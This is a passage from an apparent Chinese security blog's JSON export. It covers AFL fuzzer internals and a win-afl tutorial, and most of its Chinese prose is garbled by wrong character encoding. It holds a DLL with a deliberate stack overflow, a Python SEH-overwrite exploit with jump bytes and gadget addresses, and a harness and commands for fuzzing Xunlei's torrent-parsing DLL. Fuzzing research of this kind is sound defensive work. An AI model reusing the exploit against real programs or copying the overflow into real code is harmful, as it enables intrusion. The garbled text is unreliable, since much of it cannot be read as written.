å°„åˆ°äº†è‡ªå·±çš„å†…å­˜ç©ºé—´ä¸­ï¼Œå¹¶å°†å…¶åœ°å€ä¿å­˜åœ¨__afl_area_ptråŠedxä¸­ 12345678910111213141516171819202122232425262728293031323334&quot;\\n&quot; &quot;__afl_setup:\\n&quot; &quot;\\n&quot; &quot; /* Do not retry setup if we had previous failures. */\\n&quot; &quot;\\n&quot; &quot; cmpb $0, __afl_setup_failure\\n&quot; &quot; jne __afl_return\\n&quot; &quot;\\n&quot; &quot; /* Map SHM, jumping to __afl_setup_abort if something goes wrong.\\n&quot; &quot; We do not save FPU/MMX/SSE registers here, but hopefully, nobody\\n&quot; &quot; will notice this early in the game. */\\n&quot; &quot;\\n&quot; &quot; pushl %eax\\n&quot; &quot; pushl %ecx\\n&quot; &quot;\\n&quot; &quot; pushl $.AFL_SHM_ENV\\n&quot; &quot; call getenv\\n&quot; &quot; addl $4, %esp\\n&quot; &quot;\\n&quot; &quot; testl %eax, %eax\\n&quot; &quot; je __afl_setup_abort\\n&quot; &quot;\\n&quot; &quot; pushl %eax\\n&quot; &quot; call atoi\\n&quot; &quot; addl $4, %esp\\n&quot; &quot;\\n&quot; &quot; pushl $0 /* shmat flags */\\n&quot; &quot; pushl $0 /* requested addr */\\n&quot; &quot; pushl %eax /* SHM ID */\\n&quot; &quot; call shmat\\n&quot; &quot; addl $12, %esp\\n&quot; &quot;\\n&quot; &quot; cmpl $-1, %eax\\n&quot; &quot; je __afl_setup_abort\\n&quot; åˆ†æ”¯ä¿¡æ¯çš„è®°å½• æ¥åˆ°æ–‡ç« å¼€å§‹æŠ›å‡ºçš„ç–‘é—®__afl_maybe_logå¹²äº†ä»€ä¹ˆ 123456789101112&quot;__afl_maybe_log:\\n&quot;&quot;\\n&quot;&quot; lahf\\n&quot;&quot; seto %al\\n&quot;&quot;\\n&quot;&quot; /* Check if SHM region is already mapped. */\\n&quot;&quot;\\n&quot;&quot; movl __afl_area_ptr, %edx\\n&quot;&quot; testl %edx, %edx\\n&quot;&quot; je __afl_setup\\n&quot;&quot;\\n&quot;&quot;__afl_store:\\n&quot; è¯»ä»£ç å°±çŸ¥é“äº†ï¼š æ£€æŸ¥å…±äº«å†…å­˜çš„æ˜ å°„ï¼Œæœ‰é”™è¿›å…¥åˆ°__afl_setup å¼€å§‹__afl_storeï¼š 123456789101112131415161718192021 &quot;__afl_store:\\n&quot; &quot;\\n&quot; &quot; /* Calculate and store hit for the code location specified in ecx. There\\n&quot; &quot; is a double-XOR way of doing this without tainting another register,\\n&quot; &quot; and we use it on 64-bit systems; but it&#x27;s slower for 32-bit ones. */\\n&quot; &quot;\\n&quot;#ifndef COVERAGE_ONLY &quot; movl __afl_prev_loc, %edi\\n&quot; &quot; xorl %ecx, %edi\\n&quot; &quot; shrl $1, %ecx\\n&quot; &quot; movl %ecx, __afl_prev_loc\\n&quot;#else &quot; movl %ecx, %edi\\n&quot;#endif /* ^!COVERAGE_ONLY */ &quot;\\n&quot;#ifdef SKIP_COUNTS &quot; orb $1, (%edx, %edi, 1)\\n&quot;#else &quot; incb (%edx, %edi, 1)\\n&quot;#endif /* ^SKIP_COUNTS */ &quot;\\n&quot; __afl_prev_locï¼šå‰ä¸€æ¬¡è·³è½¬çš„â€ä½ç½®â€ ecxï¼šæœ€å¼€å§‹æ’æ¡©çš„éšæœºæ•°ä½ç½®ï¼Œå³ä»£ç å—çš„æ ‡å· å› æ­¤ï¼ŒAFLä¸ºæ¯ä¸ªä»£ç å—ç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œä½œä¸ºå…¶â€œä½ç½®â€çš„è®°å½•ï¼›éšåï¼Œå¯¹åˆ†æ”¯å¤„çš„â€æºä½ç½®â€œå’Œâ€ç›®æ ‡ä½ç½®â€œè¿›è¡Œå¼‚æˆ–ï¼Œå¹¶å°†å¼‚æˆ–çš„ç»“æœä½œä¸ºè¯¥åˆ†æ”¯çš„keyï¼Œä¿å­˜æ¯ä¸ªåˆ†æ”¯çš„æ‰§è¡Œæ¬¡æ•°ã€‚ç”¨äºä¿å­˜æ‰§è¡Œæ¬¡æ•°çš„å®é™…ä¸Šæ˜¯ä¸€ä¸ªå“ˆå¸Œè¡¨ï¼Œå¤§å°ä¸ºMAP_SIZE=64Kï¼Œå½“ç„¶ä¼šå­˜åœ¨ç¢°æ’çš„é—®é¢˜ï¼›ä½†æ ¹æ®AFLæ–‡æ¡£ä¸­çš„ä»‹ç»ï¼Œå¯¹äºä¸æ˜¯å¾ˆå¤æ‚çš„ç›®æ ‡ï¼Œç¢°æ’æ¦‚ç‡è¿˜æ˜¯å¯ä»¥æ¥å—çš„ï¼š åœ¨æœ€åmap densityå°±æ˜¯æŒ‡çš„å“ˆå¸Œè¡¨çš„å¯†åº¦ï¼Œè¶Šå°å‘ç”Ÿç¢°æ’çš„æ¦‚ç‡è¶Šå° åˆ†æ”¯ä¿¡æ¯çš„åˆ†æ å‰æ–‡æåˆ°äº† trace_bitsä¿å­˜äº†å…±äº«å†…å­˜ å…±äº«å†…å­˜ä¿å­˜äº†åˆ†æè®°å½• é‚£ä¹ˆï¼Œå¯¹äºAFLä»è¿™å—å…±äº«å†…å­˜ä¸­è·å¾—ä¿¡æ¯å°±æ˜¾å¾—å¾ˆåˆç†äº† åœ¨é¢„å¤„ç†å…±äº«å†…å­˜æ—¶ 1234567891011121314151617181920static inline void classify_counts(u32* mem) &#123; u32 i = MAP_SIZE &gt;&gt; 2; while (i--) &#123; /* Optimize for sparse bitmaps. */ if (unlikely(*mem)) &#123; u16* mem16 = (u16*)mem; mem16[0] = count_class_lookup16[mem16[0]]; mem16[1] = count_class_lookup16[mem16[1]]; &#125; mem++; &#125;&#125; 12345678910111213141516/* Destructively classify execution counts in a trace. This is used as a preprocessing step for any newly acquired traces. Called on every exec, must be fast. */static const u8 count_class_lookup8[256] = &#123; [0] = 0, [1] = 1, [2] = 2, [3] = 4, [4 ... 7] = 8, [8 ... 15] = 16, [16 ... 31] = 32, [32 ... 127] = 64, [128 ... 255] = 128&#125;; æœ€é‡è¦çš„æ˜¯count_class_lookup8ï¼Œtargetæ˜¯å°†æ¯ä¸ªåˆ†æ”¯çš„æ‰§è¡Œæ¬¡æ•°ç”¨1ä¸ªbyteæ¥å‚¨å­˜ï¼Œè€Œfuzzeråˆ™è¿›ä¸€æ­¥æŠŠè¿™ä¸ªæ‰§è¡Œæ¬¡æ•°å½’å…¥bucketsä¸­ï¼Œæ¯”å¦‚æ‰§è¡Œ1æ¬¡ï¼Œmem16 = count_class_lookup8[1]; == 1 æ‰§è¡Œ3æ¬¡mem16 = count_class_lookup8[3]; == 4ã€‚æ‰§è¡Œ4æ¬¡mem16 = count_class_lookup8[4]; == 8 å¥½å¤„å°±åœ¨äºåˆ†æ”¯Aæ‰§è¡Œäº†32æ¬¡ï¼›å¯¹å¦å¤–ä¸€ä¸ªæµ‹è¯•ç”¨ä¾‹ï¼Œåˆ†æ”¯Aæ‰§è¡Œäº†33æ¬¡ï¼Œé‚£ä¹ˆAFLå°±ä¼šè®¤ä¸ºè¿™ä¸¤æ¬¡çš„ä»£ç è¦†ç›–æ˜¯ç›¸åŒçš„ã€‚è¿™æ ·é€šè¿‡ä»£ç å—çš„æ‰§è¡Œæ¬¡æ•°å°±å¯ä»¥ç»Ÿè®¡ç›¸å…³è·¯å¾„ï¼ŒAFLæ ¹æ®ç›¸å…³è·¯å¾„çš„HASHåˆ¤æ–­è·¯å¾„æ˜¯å¦å‘ç”Ÿæ”¹å˜ã€‚ æ–‡ä»¶å˜å¼‚è§„åˆ™ çœ‹åˆ°å¥½å¤šç ”ç©¶ç”Ÿè®ºæ–‡éƒ½æ˜¯ä»è¿™é‡Œä¸‹æ‰‹çš„ã€‚ã€‚ã€‚ bitflipï¼ŒæŒ‰ä½ç¿»è½¬ï¼Œ1å˜ä¸º0ï¼Œ0å˜ä¸º1 åœ¨å¯¹æ¯ä¸ªbyteè¿›è¡Œç¿»è½¬æ—¶ï¼Œå¦‚æœå…¶é€ æˆæ‰§è¡Œè·¯å¾„ä¸åŸå§‹è·¯å¾„ä¸ä¸€è‡´ï¼Œå°±å°†è¯¥byteåœ¨effector mapä¸­æ ‡è®°ä¸º1ï¼Œå³â€œæœ‰æ•ˆâ€çš„ï¼Œå¦åˆ™æ ‡è®°ä¸º0ï¼Œå³â€œæ— æ•ˆâ€çš„ arithmeticï¼Œæ•´æ•°åŠ /å‡ç®—æœ¯è¿ç®— å¯¹ç›®æ ‡æ•´æ•°ä¼šè¿›è¡Œ+1, +2, â€¦, +35, -1, -2, â€¦, -35çš„å˜å¼‚ã€‚ç‰¹åˆ«åœ°ï¼Œç”±äºæ•´æ•°å­˜åœ¨å¤§ç«¯åºå’Œå°ç«¯åºä¸¤ç§è¡¨ç¤ºæ–¹å¼ï¼ŒAFLä¼šè´´å¿ƒåœ°å¯¹è¿™ä¸¤ç§æ•´æ•°è¡¨ç¤ºæ–¹å¼éƒ½è¿›è¡Œå˜å¼‚ã€‚ interestï¼ŒæŠŠä¸€äº›ç‰¹æ®Šå†…å®¹æ›¿æ¢åˆ°åŸæ–‡ä»¶ä¸­ ç”¨äºæ›¿æ¢çš„&quot;interesting values&quot;ï¼Œæ˜¯AFLé¢„è®¾çš„ä¸€äº›æ¯”è¾ƒç‰¹æ®Šçš„æ•°ã€‚ config.h 1234567891011121314151617181920212223242526272829303132#define INTERESTING_8 \\ -128, /* Overflow signed 8-bit when decremented */ \\ -1, /* */ \\ 0, /* */ \\ 1, /* */ \\ 16, /* One-off with common buffer size */ \\ 32, /* One-off with common buffer size */ \\ 64, /* One-off with common buffer size */ \\ 100, /* One-off with common buffer size */ \\ 127 /* Overflow signed 8-bit when incremented */#define INTERESTING_16 \\ -32768, /* Overflow signed 16-bit when decremented */ \\ -129, /* Overflow signed 8-bit */ \\ 128, /* Overflow signed 8-bit */ \\ 255, /* Overflow unsig 8-bit when incremented */ \\ 256, /* Overflow unsig 8-bit */ \\ 512, /* One-off with common buffer size */ \\ 1000, /* One-off with common buffer size */ \\ 1024, /* One-off with common buffer size */ \\ 4096, /* One-off with common buffer size */ \\ 32767 /* Overflow signed 16-bit when incremented */#define INTERESTING_32 \\ -2147483648LL, /* Overflow signed 32-bit when decremented */ \\ -100663046, /* Large negative number (endian-agnostic) */ \\ -32769, /* Overflow signed 16-bit */ \\ 32768, /* Overflow signed 16-bit */ \\ 65535, /* Overflow unsig 16-bit when incremented */ \\ 65536, /* Overflow unsig 16 bit */ \\ 100663045, /* Large positive number (endian-agnostic) */ \\ 2147483647 /* Overflow signed 32-bit when incremented */ dictionaryï¼ŒæŠŠè‡ªåŠ¨ç”Ÿæˆæˆ–ç”¨æˆ·æä¾›çš„tokenæ›¿æ¢/æ’å…¥åˆ°åŸæ–‡ä»¶ä¸­ï¼ˆä»å¤´å¼€å§‹ï¼‰ -xé€‰é¡¹è®¾ç½®çš„token havocï¼Œä¸­æ–‡æ„æ€æ˜¯â€œå¤§ç ´åâ€ï¼Œæ­¤é˜¶æ®µä¼šå¯¹åŸæ–‡ä»¶è¿›è¡Œå¤§é‡å˜å¼‚ï¼Œå…·ä½“è§ä¸‹æ–‡ å¼€å§‹æ™ºåŠ›ä¸‹é™ï¼Œæˆ‘åœ¨fuzzä¸­çœ‹åˆ°çš„å¤§å¤šæ•°éƒ½æ˜¯è¿™ä¸ªé˜¶æ®µï¼ˆé˜¿å·´é˜¿å·´ï¼‰ éšæœºé€‰å–æŸä¸ªbitè¿›è¡Œç¿»è½¬ éšæœºé€‰å–æŸä¸ªbyteï¼Œå°†å…¶è®¾ç½®ä¸ºéšæœºçš„interesting value éšæœºé€‰å–æŸä¸ªwordï¼Œå¹¶éšæœºé€‰å–å¤§ã€å°ç«¯åºï¼Œå°†å…¶è®¾ç½®ä¸ºéšæœºçš„interesting value éšæœºé€‰å–æŸä¸ªdwordï¼Œå¹¶éšæœºé€‰å–å¤§ã€å°ç«¯åºï¼Œå°†å…¶è®¾ç½®ä¸ºéšæœºçš„interesting value éšæœºé€‰å–æŸä¸ªbyteï¼Œå¯¹å…¶å‡å»ä¸€ä¸ªéšæœºæ•° éšæœºé€‰å–æŸä¸ªbyteï¼Œå¯¹å…¶åŠ ä¸Šä¸€ä¸ªéšæœºæ•° éšæœºé€‰å–æŸä¸ªwordï¼Œå¹¶éšæœºé€‰å–å¤§ã€å°ç«¯åºï¼Œå¯¹å…¶å‡å»ä¸€ä¸ªéšæœºæ•° éšæœºé€‰å–æŸä¸ªwordï¼Œå¹¶éšæœºé€‰å–å¤§ã€å°ç«¯åºï¼Œå¯¹å…¶åŠ ä¸Šä¸€ä¸ªéšæœºæ•° éšæœºé€‰å–æŸä¸ªdwordï¼Œå¹¶éšæœºé€‰å–å¤§ã€å°ç«¯åºï¼Œå¯¹å…¶å‡å»ä¸€ä¸ªéšæœºæ•° éšæœºé€‰å–æŸä¸ªdwordï¼Œå¹¶éšæœºé€‰å–å¤§ã€å°ç«¯åºï¼Œå¯¹å…¶åŠ ä¸Šä¸€ä¸ªéšæœºæ•° éšæœºé€‰å–æŸä¸ªbyteï¼Œå°†å…¶è®¾ç½®ä¸ºéšæœºæ•° éšæœºåˆ é™¤ä¸€æ®µbytes éšæœºé€‰å–ä¸€ä¸ªä½ç½®ï¼Œæ’å…¥ä¸€æ®µéšæœºé•¿åº¦çš„å†…å®¹ï¼Œå…¶ä¸­75%çš„æ¦‚ç‡æ˜¯æ’å…¥åŸæ–‡ä¸­éšæœºä½ç½®çš„å†…å®¹ï¼Œ25%çš„æ¦‚ç‡æ˜¯æ’å…¥ä¸€æ®µéšæœºé€‰å–çš„æ•° éšæœºé€‰å–ä¸€ä¸ªä½ç½®ï¼Œæ›¿æ¢ä¸ºä¸€æ®µéšæœºé•¿åº¦çš„å†…å®¹ï¼Œå…¶ä¸­75%çš„æ¦‚ç‡æ˜¯æ›¿æ¢æˆåŸæ–‡ä¸­éšæœºä½ç½®çš„å†…å®¹ï¼Œ25%çš„æ¦‚ç‡æ˜¯æ›¿æ¢æˆä¸€æ®µéšæœºé€‰å–çš„æ•° éšæœºé€‰å–ä¸€ä¸ªä½ç½®ï¼Œç”¨éšæœºé€‰å–çš„tokenï¼ˆç”¨æˆ·æä¾›çš„æˆ–è‡ªåŠ¨ç”Ÿæˆçš„ï¼‰æ›¿æ¢ éšæœºé€‰å–ä¸€ä¸ªä½ç½®ï¼Œç”¨éšæœºé€‰å–çš„tokenï¼ˆç”¨æˆ·æä¾›çš„æˆ–è‡ªåŠ¨ç”Ÿæˆçš„ï¼‰æ’å…¥ spliceï¼Œä¸­æ–‡æ„æ€æ˜¯â€œç»æ¥â€ï¼Œæ­¤é˜¶æ®µä¼šå°†ä¸¤ä¸ªæ–‡ä»¶æ‹¼æ¥èµ·æ¥å¾—åˆ°ä¸€ä¸ªæ–°çš„æ–‡ä»¶ spliceæ˜¯å°†ä¸¤ä¸ªseedæ–‡ä»¶æ‹¼æ¥å¾—åˆ°æ–°çš„æ–‡ä»¶ï¼Œå¹¶å¯¹è¿™ä¸ªæ–°æ–‡ä»¶ç»§ç»­æ‰§è¡Œhavocå˜å¼‚ cycleï¼šå¯¹é˜Ÿåˆ—æ‰€æœ‰æ–‡ä»¶å…¨éƒ¨æŒ‰ç…§ä¸Šé¢çš„æ­¥éª¤æ¥ä¸€éå°±ç®—å®Œæˆäº†ä¸€ä¸ªcycleï¼Œæ•´ä¸ªé˜Ÿåˆ—åˆä¼šä»ç¬¬ä¸€ä¸ªæ–‡ä»¶å¼€å§‹ï¼Œå†æ¬¡è¿›è¡Œå˜å¼‚ï¼Œä¸è¿‡ä¸ç¬¬ä¸€æ¬¡å˜å¼‚ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸€æ¬¡å°±ä¸éœ€è¦å†è¿›è¡Œdeterministic fuzzingäº†ã€‚ å‚è€ƒ https://paper.seebug.org/496/ https://github.com/google/AFL","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"source","slug":"source","permalink":"https://joe1sn.eu.org/tags/source/"},{"name":"AFL","slug":"AFL","permalink":"https://joe1sn.eu.org/tags/AFL/"}]},{"title":"ã€æ¼æ´æŒ–æ˜ã€‘win-aflä½¿ç”¨æŒ‡åŒ—-ä¸­çº§ç¯‡","slug":"win-afl2","date":"2023-07-19T14:06:52.000Z","updated":"2023-07-21T03:32:53.355Z","comments":true,"path":"2023/07/19/win-afl2/","link":"","permalink":"https://joe1sn.eu.org/2023/07/19/win-afl2/","excerpt":"ä¸ºä»€ä¹ˆä¸å«é«˜çº§ç¯‡ï¼Œå› ä¸ºé«˜çº§çš„æˆ‘ä¹Ÿä¸ä¼š ä¸»è¦è®²ä¸€ä¸‹æ›´è´´è¿‘å®é™…çš„ç”¨æ³•å§ !!!ä»…å¤§æ ‡é¢˜1å®Œæˆï¼Œå…¨ç‰‡æœªå®Œå¾…ç»­!!!","text":"ä¸ºä»€ä¹ˆä¸å«é«˜çº§ç¯‡ï¼Œå› ä¸ºé«˜çº§çš„æˆ‘ä¹Ÿä¸ä¼š ä¸»è¦è®²ä¸€ä¸‹æ›´è´´è¿‘å®é™…çš„ç”¨æ³•å§ !!!ä»…å¤§æ ‡é¢˜1å®Œæˆï¼Œå…¨ç‰‡æœªå®Œå¾…ç»­!!! å¯¹DLLè¿›è¡ŒFuzz ç†è®ºæµ‹è¯• ä»£ç è¿˜æ˜¯ä¸Šä¸€ç¯‡æåˆ°çš„ä»£ç ï¼Œä¾æ—§æ˜¯32ä½ï¼Œåªä¸è¿‡æº¢å‡ºéƒ¨åˆ†å†™åœ¨DLLé‡Œé¢ dll.c 123456789101112131415161718192021#include &lt;stdio.h&gt;__declspec(dllexport) void vuln(char *FileDir)&#123; char password[6] = &quot;ABCDE&quot;; char str[6]; FILE *fp; if(!(fp=fopen(FileDir,&quot;r&quot;)))&#123; printf(&quot;Open Failed\\n&quot;); exit(0); &#125; fgets(str, 0x1000, fp); str[5]=&#x27;\\0&#x27;; if(strcmp(str,password)==0) // fprintf(stderr,&quot;OK.\\n&quot;); printf(&quot;OK.\\n&quot;); else // fprintf(stderr,&quot;NO.\\n&quot;); printf(&quot;NO.\\n&quot;);&#125; ç¼–è¯‘ 1gcc -shared -o mydll.dll dll.c main.c 12345678910111213#include &lt;stdio.h&gt;__declspec(dllimport) void vuln();int main(int argc, char *argv[])&#123; if (argc != 2)&#123; printf(&quot;Usage: ./HelloWorld.exe FileName\\n&quot;); return 0; &#125; vuln(argv[1]); return 0;&#125; 1gcc -o main main.c mydll.dll ä¸æƒ³è”åˆç¼–è¯‘çš„è¯ä¹Ÿå¯ä»¥ä½¿ç”¨GetProAddressæ¥ç¼–å†™å¦‚ä¸‹harness 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;windows.h&gt;typedef DWORD(__cdecl *pvuln)(char* aFileName);pvuln vuln = NULL;extern &quot;C&quot; __declspec(dllexport) int main(int argc, char *argv[])&#123; char mydll_path[] = &quot;D:\\\\HackTools\\\\Fuzz\\\\WinAFLFuzz\\\\testcase\\\\dll\\\\mydll.dll&quot;; if (argc != 2)&#123; printf(&quot;Usage: ./HelloWorld.exe FileName\\n&quot;); return 0; &#125; static HMODULE hMyDLL = NULL; hMyDLL = LoadLibraryA(mydll_path); if(hMyDLL == NULL)&#123; printf(&quot;Load DLL Failed\\n&quot;); goto END; &#125; vuln = (pvuln)GetProcAddress(hMyDLL,&quot;vuln&quot;); if(vuln == NULL)&#123; printf(&quot;Get Process Address Failed\\n&quot;); goto END; &#125; vuln(argv[1]);END: if(hMyDLL)&#123; FreeLibrary(hMyDLL); &#125; return 0;&#125; å¼€å§‹æ’æ¡©çœ‹çœ‹ 12345678D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32\\drrun.exe ^-c D:\\HackTools\\Fuzz\\__FuzzWork\\winafl\\build_Win32\\bin\\Release\\winafl.dll -debug ^-debug ^-coverage_module mydll.dll ^-target_module main.exe ^-target_offset 0x16B0 ^-fuzz_iterations 10 -nargs 2 -- ^main.exe .\\in\\password.txt å¼€å§‹fuzz 12345678910afl-fuzz.exe ^-i .\\in ^-o .\\out ^-D &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32&quot; ^-I 100000+ -t 90000+ -- ^-coverage_module mydll.dll ^-target_module main.exe ^-target_offset 0x16B0 ^-fuzz_iterations 5000 -nargs 2 -- ^main.exe @@ ç¬é—´æ‰¾åˆ°crash æ ·æœ¬é•¿è¿™æ · è¿™æ¬¡å°è¯•ä½¿ç”¨x32dbgåˆ†æ å¾—åˆ°EXP 12345678910111213payload = b&quot;&quot;shellcode = b&quot;&quot;offset = b&quot;A&quot;*(0x12c-len(shellcode)-32) #0x1cNSEH = b&quot;\\xeb\\x06\\x90\\x90&quot; #asm(&quot;jmp 6;nop;nop&quot;)gadget = b&quot;\\xEA\\x23\\x40\\x00&quot; #004023EAself_gadget = b&quot;\\x89\\xE0\\x05\\x24\\x06\\x00\\x00\\xFF\\xE0&quot; # mov eax, esp # sub eax, 0x608 # jmp eaxpayload = b&quot;\\xaa&quot;*32+shellcode+offset+NSEH+gadget+self_gadgetwith open(&quot;password.txt&quot;,&quot;wb&quot;) as f: f.write(payload) è¦ç‚¹å°±æ˜¯ï¼šFuzzçš„æ—¶å€™å’Œæ’æ¡©çš„æ—¶å€™åŠ ä¸Š-coverage_module &lt;ä½ çš„dll&gt; å®é™…æµ‹è¯• ä½ å·²ç»å­¦ä¼šäº†1+1=2ï¼Œè¯·è¯æ˜è´¹é©¬å¤§å®šç†å§ï¼Œä¸ºäº†ç»Ÿä¸€å’Œæ–¹ä¾¿ï¼Œè¿™é‡Œä¹Ÿç”¨çœ‹é›ªé‡Œé¢çš„ä¸€ç¯‡æ–‡ç«  ä½¿ç”¨winaflå¯¹è¿…é›·çš„torrentè§£æé€»è¾‘è¿›è¡Œfuzz é¦–å…ˆæ˜¯æ‰¾åˆ°åˆé€‚çš„è½¯ä»¶ï¼Œç„¶åçŸ¥é“ä»–é‚£ä¸ªåŠŸèƒ½æ˜¯åœ¨é‚£ä¸ªdllä¸­çš„ï¼Œä½ å¯ä»¥ä½¿ç”¨ProcessMonitoræŸ¥çœ‹ï¼ˆä¿—ç§°procmonï¼‰ï¼Œæˆªå›¾æ²¡æœ‰ï¼Œç‰¹å¾å°±æ˜¯å½“ä½ æ‰“å¼€ä¸€ä¸ª.torrentæ–‡ä»¶åï¼Œthunder.exeä¼šé©¬ä¸ŠåŠ è½½AssisstantTools.dllã€‚é€šè¿‡æŸ¥çœ‹å¯¼å‡ºè¡¨å¯ä»¥æ‰¾åˆ°ä¸€äº›å¯ä»¥æµ‹è¯•çš„å‡½æ•°ï¼Œè¿™é‡Œæˆ‘æµ‹è¯•çš„æ˜¯XL_ParseTorrentFile æŸ¥çœ‹å¯¼å…¥è¡¨å¯ä»¥çœ‹åˆ°ä¾èµ–çš„P2PBase.dll æ‰€ä»¥fuzzçš„æ—¶å€™ä¹Ÿè¦åŠ ä¸Šï¼Œå¼€å§‹ç¼–å†™harnessï¼Œä½ å¯ä»¥ç”¨é‚£ç¯‡æ–‡ç« é‡Œé¢çš„ï¼Œä½†æ˜¯æˆ‘è¿™é‡Œå°±å¾ˆæ…¢ï¼Œ åŸæ–‡æ–‡ç« ä¸­çš„harnessç”±äºusingé™„è¿‘çš„ä»£ç åªåœ¨c++11ä¸­æ”¯æŒï¼Œæ‰€ä»¥ä½¿ç”¨gccç¼–è¯‘æŠ¥é”™çš„å¯ä»¥å°è¯•åŠ ä¸Š-std=c++11 å¦‚æœä½ ä½¿ç”¨çš„æ˜¯ä¸‹é¢æˆ‘ç¼–å†™çš„harnessï¼Œé‚£ä¹ˆç›´æ¥ç¼–è¯‘å°±å¯ä»¥äº† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;#include &lt;windows.h&gt;typedef DWORD(__cdecl *pXL_ParseTorrentFile)(CHAR* aFileName, PVOID* a1);pXL_ParseTorrentFile XL_ParseTorrentFile = NULL;typedef DWORD(__cdecl *pXL_ReleaseTorrentFileInfo)(PVOID a1);pXL_ReleaseTorrentFileInfo XL_ReleaseTorrentFileInfo = NULL;extern &quot;C&quot; __declspec(dllexport) void fuzz_method(char *FilePath)&#123; PVOID a1 = NULL; XL_ParseTorrentFile(FilePath, &amp;a1); if (a1) &#123; XL_ReleaseTorrentFileInfo(a1); &#125; return;&#125;int main(int argc, char *argv[])&#123; //char AssisstantToolsPath[] = &quot;D:\\\\HackTools\\\\Fuzz\\\\WinAFLFuzz\\\\testcase\\\\thunder_fuzzer\\\\a.dll&quot;; if (argc != 2)&#123; printf(&quot;Usage: ./HelloWorld.exe FileName\\n&quot;); return 0; &#125; static HMODULE hMyDLL = NULL; hMyDLL = LoadLibraryA(&quot;AssistantTools.dll&quot;); if(hMyDLL == NULL)&#123; printf(&quot;Load DLL Failed\\n&quot;); goto END; &#125; XL_ParseTorrentFile = (pXL_ParseTorrentFile)GetProcAddress(hMyDLL, &quot;XL_ParseTorrentFile&quot;); if(XL_ParseTorrentFile == NULL)&#123; printf(&quot;Get Process Address Failed\\n&quot;); goto END; &#125; XL_ReleaseTorrentFileInfo = (pXL_ReleaseTorrentFileInfo)GetProcAddress(hMyDLL, &quot;XL_ReleaseTorrentFileInfo&quot;); if(XL_ReleaseTorrentFileInfo == NULL)&#123; printf(&quot;Get Process Address Failed\\n&quot;); goto END; &#125; fuzz_method(argv[1]);END: if(hMyDLL)&#123; FreeLibrary(hMyDLL); &#125; printf(&quot;Done\\n&quot;);&#125; ä½ å¯ä»¥ç”¨drrun -t drcov --æ¥æµ‹è¯•çœ‹æ˜¯ä¸æ˜¯ä½¿ç”¨æˆåŠŸï¼Œä¹‹åä½¿ç”¨drrunæµ‹è¯• 12345678&quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32\\drrun.exe&quot; ^-c winafl.dll -debug ^-coverage_module P2PBase.dll ^-coverage_module AssistantTools.dll ^-target_module fuzz_program.exe ^-target_offset 0x11ef ^-fuzz_iterations 10 -nargs 2 ^-- fuzz_program.exe &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\testin\\ubuntu-18.04.5-desktop-amd64.iso.torrent&quot; é—®é¢˜1ï¼š å¦‚æœä½ ä½¿ç”¨çš„Dynamorioæ˜¯å¤§äº 8.0.0-1ç‰ˆæœ¬çš„ï¼Œå¾ˆå¤§æ¦‚ç‡ä¼šå‡ºç°é”™è¯¯ç±»ä¼¼äºä¸‹é¢ è¿™ç§æƒ…å†µå°±æ˜¯ç”Ÿæˆè¦†ç›–ç‡æ–‡ä»¶æ˜¯å¯¹çš„ï¼Œä½†æ˜¯æµ‹è¯•çš„æ—¶å€™å½“ç¨‹åºè¿›è¡ŒIATå¯¼å…¥çš„æ—¶å€™ï¼Œåœ¨dynamorioä¸­çš„harnesså´©æºƒäº†ï¼Œæ‰€ä»¥ç¨‹åºè¿˜æ²¡æœ‰è¿›å…¥entryå…¥å£ç‚¹å‡½æ•°å°±ç›´æ¥å¯„äº†ã€‚è¿™ä¸ªé”™è¯¯å¾ˆæœ‰æ„æ€ï¼ŒåŠ è½½ç±»ä¼¼ntdll.dllæˆ–è€…è‡ªå·±åœ¨windowsä¸Šå†™çš„DLLï¼ˆå“ªæ€•æ— ç¬¦å·ï¼‰éƒ½å¯ä»¥ï¼Œå½“harnessä¸­çš„LoadLibraryè½½å…¥å…¶ä»–DLLçš„æ—¶å€™ï¼ˆæ¯”å¦‚æŸä¸ªè½¯ä»¶çš„ffmpeg.dllï¼‰ä¹Ÿä¼šæŠ¥é”™ã€‚ è¿™ä¸ªé—®é¢˜æˆ‘è§£å†³äº†ä¸€å¤©ä¹Ÿæ²¡æœ‰è§£å†³ï¼Œåˆ°æ˜¯åœ¨çœ‹é›ªæ‰¾äº†ä¸€ä¸ªå’Œæˆ‘ä¸€æ ·çš„å¸–å­ https://bbs.kanxue.com/thread-274169.htm æœ€åæˆ‘çš„è§£å†³æ–¹æ³•æ˜¯æ›´æ¢åˆ°dynamorio 8.0.0-1ç‰ˆæœ¬è¿‡åé‡æ–°ç¼–è¯‘å°±è¡Œäº† é—®é¢˜2ï¼š å½“ä½ ä½¿ç”¨target_methodçš„æ—¶å€™ï¼Œç¨‹åºæ‰¾ä¸åˆ°è¯¥æ–¹æ³•ï¼Œè¿™åœ¨ä½ è¿›è¡Œæµ‹è¯•winaflæ¡ˆä¾‹çš„æ—¶å€™å¾ˆå¸¸è§ï¼ŒåŸå› æ˜¯è¯¥æ–¹æ³•æ²¡æœ‰è¿›è¡Œå¯¼å‡ºï¼Œåœ¨å‡½æ•°å‰é¢åŠ ä¸Šextern &quot;C&quot; __declspec(dllexport)å°±è¡Œäº† é¦–å…ˆå°±æ˜¯ç¼©å‡testcase 1python &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\winafl\\winafl-cmin.py&quot; --working-dir &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\winafl\\build_Win32\\bin\\Release&quot; -D &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32&quot; -t 9000 -i &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\testin&quot; -o &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\in&quot; -coverage_module AssistantTools.dll -coverage_module P2PBase.dll -target_module fuzz_program.exe -target_method fuzz_method -nargs 1 -- fuzz_program.exe @@ 